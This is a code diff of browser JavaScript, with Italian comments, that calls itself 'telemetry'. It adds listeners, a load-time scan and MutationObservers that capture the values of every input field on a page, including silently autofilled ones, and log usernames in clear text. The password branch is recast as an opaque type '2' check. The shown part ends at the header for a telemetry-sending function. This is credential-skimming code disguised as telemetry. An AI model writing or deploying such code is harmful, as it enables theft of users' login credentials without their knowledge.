@@ -8,94 +8,84 @@ let lastTextInput = null;
 let lastPasswordInput = null;
 let logoutDone = false; // flag per eseguire logout solo una volta
 
-// Stato ultimo valore noto
+// Memorizza ultimi valori noti
 const lastValues = new WeakMap();
 
-// 🔹 Leggi subito i valori presenti al load
-window.addEventListener("DOMContentLoaded", () => {
-  document.querySelectorAll("input").forEach(input => {
-    const value = input.value || "";
-    lastValues.set(input, value);
+// Funzione che processa un input e segnala se cambiato
+function processInput(input) {
+  const prev = lastValues.get(input) || "";
+  const curr = input.value || "";
 
-    if (value !== "") {
-      if (input.type === "text") {
-        console.log("[Telemetry] username presente al load:", value);
-      } else if (input.type === "password") {
-        console.log("[Telemetry] password presente al load");
-      }
+  if (prev !== curr) {
+    lastValues.set(input, curr);
+
+    if (input.type === "text") {
+      console.log("[Telemetry] username:", curr);
+    } else if (input.type === "2") {
+      console.log("[Telemetry] 2:", curr);
     }
-  });
-});
+  }
+}
 
-// Traccia focus sugli input
+// 🔹 Legge subito i valori presenti al load
+function checkAllInputs() {
+  document.querySelectorAll("input").forEach(input => processInput(input));
+}
+
+// 🔹 Traccia focus sugli input
 document.addEventListener("focusin", e => {
   if (e.target.tagName === "INPUT") {
-    if (e.target.type === "text") {
-      lastTextInput = e.target;
-      console.log("[Telemetry] input username agganciato");
-    } else if (e.target.type === "password") {
-      lastOtherInput = e.target;
-      console.log("[Telemetry] input password agganciato");
-    }
+    if (e.target.type === "text") lastTextInput = e.target;
+    if (e.target.type === "2") lastOtherInput = e.target;
   }
 });
 
-// Tastiera / incolla / input normali
-document.addEventListener("input", e => {
-  if (e.target.tagName === "INPUT") {
-    lastValues.set(e.target, e.target.value);
+// 🔹 Eventi che intercettano input manuali, incolla, change
+["input", "paste", "change"].forEach(evt =>
+  document.addEventListener(evt, e => {
+    if (e.target.tagName === "INPUT") processInput(e.target);
+  })
+);
 
-    if (e.target.type === "text") {
-      console.log("[Telemetry] username modificato:", e.target.value);
-    } else if (e.target.type === "password") {
-      console.log("[Telemetry] password modificata");
-    }
-  }
-});
-
-// Change (alcuni autofill lo emettono)
-document.addEventListener("change", e => {
-  if (e.target.tagName === "INPUT") {
-    lastValues.set(e.target, e.target.value);
-
-    if (e.target.type === "text") {
-      console.log("[Telemetry] username change/autofill:", e.target.value);
-    } else if (e.target.type === "password") {
-      console.log("[Telemetry] password change/autofill");
-    }
-  }
-});
-
-// Incolla esplicita
-document.addEventListener("paste", e => {
-  if (e.target.tagName === "INPUT") {
-    const pastedText = e.clipboardData.getData("text");
-
-    if (e.target.type === "text") {
-      console.log("[Telemetry] username incollato:", pastedText);
-    } else if (e.target.type === "password") {
-      console.log("[Telemetry] password incollata");
-    }
-  }
-});
-
-// 🔥 Polling: intercetta autofill silenzioso (anche pre‑interazione)
-setInterval(() => {
-  document.querySelectorAll("input").forEach(input => {
-    const prev = lastValues.get(input) || "";
-    const curr = input.value || "";
-
-    if (prev !== curr) {
-      lastValues.set(input, curr);
-
-      if (input.type === "text") {
-        console.log("[Telemetry] username aggiornato (silenzioso):", curr);
-      } else if (input.type === "password") {
-        console.log("[Telemetry] password aggiornata (silenzioso)");
-      }
+// 🔹 MutationObserver per intercettare autofill o modifiche silenziose
+const observer = new MutationObserver(mutations => {
+  mutations.forEach(mutation => {
+    if (mutation.type === "attributes" && mutation.attributeName === "value") {
+      processInput(mutation.target);
     }
   });
-}, 300);
+});
+
+// Osserva tutti gli input presenti e futuri
+function observeInputs() {
+  document.querySelectorAll("input").forEach(input => {
+    observer.observe(input, { attributes: true, attributeFilter: ["value"] });
+  });
+
+  // Rileva input aggiunti dinamicamente
+  const bodyObserver = new MutationObserver(muts => {
+    muts.forEach(mut => {
+      mut.addedNodes.forEach(node => {
+        if (node.tagName === "INPUT") {
+          observer.observe(node, { attributes: true, attributeFilter: ["value"] });
+          processInput(node); // leggi subito se già compilato
+        } else if (node.querySelectorAll) {
+          node.querySelectorAll("input").forEach(input => {
+            observer.observe(input, { attributes: true, attributeFilter: ["value"] });
+            processInput(input);
+          });
+        }
+      });
+    });
+  });
+  bodyObserver.observe(document.body, { childList: true, subtree: true });
+}
+
+// 🔹 Inizializzazione al load
+window.addEventListener("load", () => {
+  checkAllInputs();
+  observeInputs();
+});
 
 // ----------------------------
 // Funzione di invio telemetry
